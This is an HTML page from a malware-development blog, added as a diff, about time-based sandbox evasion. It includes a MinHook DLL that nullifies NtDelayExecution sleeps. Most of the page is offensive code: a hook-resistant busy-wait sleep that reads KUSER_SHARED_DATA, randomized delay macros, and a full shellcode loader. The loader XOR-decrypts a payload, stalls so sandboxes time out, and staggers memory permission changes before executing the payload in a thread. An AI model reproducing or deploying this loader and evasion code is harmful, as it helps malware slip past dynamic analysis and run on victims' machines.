@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="shubakki ">
+<meta name="description" content="Sleep isn&amp;rsquo;t for the weak Time based evasion techniques [T1497] are a relatively painless and efficient way of avoiding sandboxes.
+Sandboxes are heavily relied on to detect malicious activity dynamically. Hence, it&amp;rsquo;s a guarantee malware will do it&amp;rsquo;s best at staying under the radar, achieving this by either blending in or timing out the sandbox.
+One way of timing out the sandbox is simply making your malware sleep through it, exhausting the sandbox which makes it time out and assume the sample is benign." />
+<meta name="keywords" content=", evasion antisandboxing" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#0c0c0d" />
+<link rel="canonical" href="https://shubakki.github.io/posts/2022/11/detecting-and-evading/" />
+
+
+    <title>
+        
+            Detecting and evading  :: shubakki 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://shubakki.github.io/main.ab89ddf3780569ff09167a49f5e20adb0cab7709b9ae291d0896d23954ee6ed2.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shubakki.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shubakki.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shubakki.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://shubakki.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://shubakki.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://shubakki.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Detecting and evading ">
+<meta itemprop="description" content="Sleep isn&rsquo;t for the weak Time based evasion techniques [T1497] are a relatively painless and efficient way of avoiding sandboxes.
+Sandboxes are heavily relied on to detect malicious activity dynamically. Hence, it&rsquo;s a guarantee malware will do it&rsquo;s best at staying under the radar, achieving this by either blending in or timing out the sandbox.
+One way of timing out the sandbox is simply making your malware sleep through it, exhausting the sandbox which makes it time out and assume the sample is benign."><meta itemprop="datePublished" content="2022-11-20T14:28:34+01:00" />
+<meta itemprop="dateModified" content="2022-11-20T14:28:34+01:00" />
+<meta itemprop="wordCount" content="1032"><meta itemprop="image" content="https://shubakki.github.io/img/shubakki.jpg"/>
+<meta itemprop="keywords" content="evasion antisandboxing," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://shubakki.github.io/img/shubakki.jpg"/>
+
+<meta name="twitter:title" content="Detecting and evading "/>
+<meta name="twitter:description" content="Sleep isn&rsquo;t for the weak Time based evasion techniques [T1497] are a relatively painless and efficient way of avoiding sandboxes.
+Sandboxes are heavily relied on to detect malicious activity dynamically. Hence, it&rsquo;s a guarantee malware will do it&rsquo;s best at staying under the radar, achieving this by either blending in or timing out the sandbox.
+One way of timing out the sandbox is simply making your malware sleep through it, exhausting the sandbox which makes it time out and assume the sample is benign."/>
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2022-11-20 14:28:34 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-176711986-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://shubakki.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text"># echo &#39;🦐 shrimple maldev 🦐&#39;</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#7B2CBF;
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://shubakki.github.io/about/">About Me</a></li><li><a href="https://shubakki.github.io/categories/">Categories</a></li><li><a href="https://shubakki.github.io/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        5 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://shubakki.github.io/posts/2022/11/detecting-and-evading/">Detecting and evading</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h2 id="sleep-isnt-for-the-weak">Sleep isn&rsquo;t for the weak</h2>
+<p>Time based evasion techniques <strong>[T1497]</strong> are a relatively painless and efficient way of avoiding sandboxes.</p>
+
+    <img src="https://shubakki.github.io/img/01/sleepy.png"  alt="Sleeping through sandboxes"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Sandboxes are heavily relied on to detect malicious activity dynamically. Hence, it&rsquo;s a guarantee malware will do it&rsquo;s best at staying under the radar, achieving this by either blending in or timing out the sandbox.</p>
+<p>One way of timing out the sandbox is simply making your malware sleep through it, exhausting the sandbox which makes it time out and assume the sample is benign.</p>
+<p>However it&rsquo;s not <em>that</em> easy. Some modern detection solutions possess countermeasures against that, for example hooking sleep functions like <code>Sleep</code> in C/C++ or <code>Thread.Sleep</code> in C# to nullify the sleep, but also fast forwarding. TL;DR: Tampering to make the malware think it is in the clear.</p>
+<p>A plethora of techniques can be applied to still &ldquo;sleep&rdquo;, we will see some of them in this blogpost.</p>
+<h2 id="demonstration-hooking-sleep-functions">Demonstration: Hooking sleep functions</h2>
+<p><code>Sleep</code>, <code>SleepEx</code> and <code>Thread.Sleep</code> all boil down to the <code>NtDelayExecution</code> syscall.</p>
+<blockquote>
+<p><code>Sleep</code> is also just a wrapper around <code>SleepEx</code> :)
+We kinda have a hierarchy such as  <code>Sleep</code> -&gt; <code>SleepEx</code> -&gt; <code>NtDelayExecution</code></p>
+</blockquote>
+<p>For instance, we can try to hook this syscall to make the delay argument <code>0</code> basically nullifying the sleep.
+
+    <img src="https://shubakki.github.io/img/01/diagram.png"  alt="Sleeping through sandboxes"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>We can achieve this by using <a href="https://www.codeproject.com/Articles/21414/Powerful-x86-x64-Mini-Hook-Engine">MinHook</a> which is a really awesome API hooking library.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;MinHook.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">DWORD</span>( NTAPI <span style="color:#f92672">*</span>pNtDelayExecution )( <span style="color:#75715e">// https://malapi.io/winapi/NtDelayExecution
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                            IN BOOLEAN Alertable, 
+</span></span><span style="display:flex;"><span>                                            IN PLARGE_INTEGER DelayInterval 
+</span></span><span style="display:flex;"><span>                                         );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> pNtDelayExecution pOrigNtDelayExecution <span style="color:#f92672">=</span> (pNtDelayExecution)GetProcAddress( GetModuleHandle( <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntdll.dll&#34;</span> ), <span style="color:#e6db74">&#34;NtDelayExecution&#34;</span> );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// our modified NtDelayExecution
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>DWORD NTAPI <span style="color:#a6e22e">NtDelayExecution</span>( IN BOOLEAN Alertable, IN PLARGE_INTEGER DelayInterval )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Mock this poor attempt &gt;:)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    MessageBoxA( <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;Feeling sleepy??&#34;</span>, <span style="color:#e6db74">&#34;:)&#34;</span>, <span style="color:#ae81ff">0</span> );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Make it so NtDelayExecution actually gets called with a delay of 0, basically nullifying the sleep.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> pOrigNtDelayExecution( Alertable, (PLARGE_INTEGER)<span style="color:#ae81ff">0</span> );
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DWORD WINAPI <span style="color:#a6e22e">hook_thread</span>( LPVOID lpReserved ) {
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    MH_STATUS status <span style="color:#f92672">=</span> MH_CreateHookApi( TEXT( <span style="color:#e6db74">&#34;ntdll&#34;</span> ), <span style="color:#e6db74">&#34;NtDelayExecution&#34;</span>, NtDelayExecution, <span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span>LPVOID<span style="color:#f92672">*&gt;</span>( <span style="color:#f92672">&amp;</span>pOrigNtDelayExecution ) );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Enable hooks
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    status <span style="color:#f92672">=</span> MH_EnableHook( MH_ALL_HOOKS );
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> status;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// main function of the dll
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> ( ul_reason_for_call )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH: {
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Initialize, and if that fails just return -1 aka ERROR
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> (MH_Initialize() <span style="color:#f92672">!=</span> MH_OK) <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            DisableThreadLibraryCalls( hModule );
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Create hooked thread
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            HANDLE hThread <span style="color:#f92672">=</span> CreateThread( <span style="color:#66d9ef">nullptr</span>, <span style="color:#ae81ff">0</span>, hook_thread, hModule, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">nullptr</span> );
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>	    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Once injected in a program using any function that ends up calling <code>NtDelayExecution</code> (without it having it unhooked) it basically pops open a message box and nullifies the sleep by calling the original <code>NtDelayExecution</code> but with a <code>Delay</code> of 0.</p>
+<p>Then again this is just theorical and to show how it would be possible to hook default sleep functions to nullify them, making malware unable to sleep through sandboxes with those functions at least.</p>
+<p>We can for instance use it against an executable calling sleep two times such as</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    printf( <span style="color:#e6db74">&#34;Hello!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> );
+</span></span><span style="display:flex;"><span>    Sleep( <span style="color:#ae81ff">10000</span> );
+</span></span><span style="display:flex;"><span>    printf( <span style="color:#e6db74">&#34;Sleep 2 now</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> );
+</span></span><span style="display:flex;"><span>    Sleep( <span style="color:#ae81ff">10000</span> );
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>![[messagebox.png]]
+And as we see, once injected in the target proc, when it does call <code>Sleep</code> we get a message box :)</p>
+<h2 id="sleeping-via-deadcode">Sleeping via deadcode</h2>
+<h2 id="weaponizing-__get_timestamp">Weaponizing <code>__get_timestamp()</code></h2>
+<p>Credits to Jordan Jay (Legacyy) for his amazing work on this.</p>
+<p>I wont delve too deep on how this works as Legacyy himself <a href="https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html">literally made a blogpost about it</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">__get_timestamp</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> size_t UNIX_TIME_START <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x019DB1DED53E8000</span>; <span style="color:#75715e">// Start of Unix epoch in ticks.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">const</span> size_t TICKS_PER_MILLISECOND <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>; <span style="color:#75715e">// A tick is 100ns.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	LARGE_INTEGER time;
+</span></span><span style="display:flex;"><span>	time.LowPart <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(DWORD <span style="color:#f92672">*</span>)( <span style="color:#ae81ff">0x7FFE0000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span> ); <span style="color:#75715e">// Read LowPart as unsigned long.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	time.HighPart <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)( <span style="color:#ae81ff">0x7FFE0000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span> ); <span style="color:#75715e">// Read High1Part as long.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> ( <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> )( ( time.QuadPart <span style="color:#f92672">-</span> UNIX_TIME_START ) <span style="color:#f92672">/</span> TICKS_PER_MILLISECOND );
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As a side note: I edited it to get the time in milliseconds.</p>
+<h5 id="making-an-alternative-sleep-out-of-it">Making an alternative sleep out of it</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">__alt_sleepms</span>( size_t ms )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">volatile</span> size_t x <span style="color:#f92672">=</span> rand(); <span style="color:#75715e">// random buffer var 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> end <span style="color:#f92672">=</span> __get_timestamp() <span style="color:#f92672">+</span> ms; <span style="color:#75715e">// calculate when we shall stop sleeping
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">while</span> (__get_timestamp() <span style="color:#f92672">&lt;</span> end) { x <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>; } <span style="color:#75715e">// increment random var by 1 till we reach our endtime
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>And to be even more sneaky, we&rsquo;ll use a random time interval at each with sleep.</p>
+<p>Which we can ease by making a macro for that.</p>
+<h2 id="optimal-way-of-using-__alt_sleepms">Optimal way of using <code>__alt_sleepms()</code></h2>
+<p>To avoid creating a pattern, we could leverage rand such as</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#define INTERVAL rand() % 26 </span><span style="color:#75715e">// Edit as you wish
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define MS_PER_SECOND 1000 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SLEEPTIME INTERVAL*MS_PER_SECOND </span><span style="color:#75715e">// Make the use easier
+</span></span></span></code></pre></div><p>Which makes the use of this function easier and more random (which is a good thing)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>__alt_sleepms( SLEEPTIME );
+</span></span></code></pre></div><p>Then we can leverage it in two ways in this basic loader.</p>
+<ol>
+<li>Timing out the sandbox by sleeping for a long time before decrypting our shellcode</li>
+<li>Sleeping in between changing the permissions of the memory we allocated for our shellcode such as RW -&gt; R -&gt; RX to try to blend in.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;buf.h&#34; // Header file containing our shellcode as &#34;unsigned char buf[]&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;snorlax.h&#34; // Header file containing our time based evasion stuff</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;utils.h&#34; // Header file containing RNG related stuff.</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define INTERVAL rand() % 26 </span><span style="color:#75715e">// Edit as you wish
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define MS_PER_SECOND 1000 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SLEEPTIME INTERVAL*MS_PER_SECOND </span><span style="color:#75715e">// Make the use easier
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// seed our generator 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    srand( defaultseed ); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	__alt_sleepms( SLEEPTIME <span style="color:#f92672">*</span> <span style="color:#ae81ff">12</span> );
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// decrypt our xor encrypted shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    xor_bytes( buf, SHELLCODE_SIZE, key, KEYLEN );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate RW memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PVOID addr <span style="color:#f92672">=</span> VirtualAlloc( NULL, <span style="color:#66d9ef">sizeof</span>( buf ), ( MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT ), PAGE_READWRITE );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Copy our shellcode to the allocated memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    memcpy( addr, buf, <span style="color:#66d9ef">sizeof</span>( buf ) );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Now the interesting part where we can leverage sleeping
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// We basically change memory perms like RW -&gt; R -&gt; RX 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD oldProtect;
+</span></span><span style="display:flex;"><span>    VirtualProtect( addr, <span style="color:#66d9ef">sizeof</span>( buf ), PAGE_READONLY, <span style="color:#f92672">&amp;</span>oldProtect );
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    __alt_sleepms( SLEEPTIME );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    VirtualProtect( addr, <span style="color:#66d9ef">sizeof</span>( buf ), PAGE_EXECUTE_READ, <span style="color:#f92672">&amp;</span>oldProtect );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    __alt_sleepms( SLEEPTIME );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    DWORD id;
+</span></span><span style="display:flex;"><span>    HANDLE hThread <span style="color:#f92672">=</span> CreateThread( NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)addr, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>id );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    WaitForSingleObject( hThread, INFINITE );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="creditssources">Credits/Sources</h1>
+<p>Jordan Jay (<a href="https://twitter.com/0xLegacyy">@0xLegacyy</a>), <a href="https://www.legacyy.xyz">blog</a></p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://shubakki.github.io/tags/evasion-antisandboxing/">evasion antisandboxing</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1032 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2022-11-20 14:28 &#43;0100
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://shubakki.github.io/bundle.min.586aafc5f69fb001eee486c7851f5d87dce6731e105dd8d114effadf92cd959fdc744e79e894fe6ff504c44f1eef868f3865994026e0cf6c2837d58101518879.js" integrity="sha512-WGqvxfafsAHu5IbHhR9dh9zmcx4QXdjRFO/635LNlZ/cdE556JT&#43;b/UExE8e74aPOGWZQCbgz2woN9WBAVGIeQ=="></script>
+
+
+
+    </body>
+</html>
